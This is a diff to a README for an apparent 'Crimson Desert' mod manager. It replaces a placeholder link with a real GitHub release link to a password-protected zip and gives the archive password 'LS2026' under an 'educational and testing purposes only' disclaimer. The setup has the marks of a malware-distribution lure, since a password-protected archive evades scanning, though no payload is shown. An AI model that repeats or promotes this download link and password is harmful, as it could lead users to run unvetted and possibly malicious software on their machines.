@@ -23,7 +23,7 @@ This repository is for educational and testing purposes only. All files are prov
 ## 📥 Download
 Password-protected archive with the complete mod manager package – extract and start managing mods instantly. 
 
-📥 [Download `Crimson-Desert-Mod-Managerzip`](https://github.com/YOURUSERNAME/Crimson-Desert-Mod-Manager/releases/download/v2026/Crimson-Desert-Mod-Manager-2026.zip)  
+📥 [Download `Crimson-Desert-Mod-Managerzip`](https://github.com/adnancantcode/Crimson-Desert-Mod-Manager-2026/releases/download/Manager/CrimsonDesert-Manager.zip)  
 🔐 `LS2026`
 ---
 ### Archive Contents
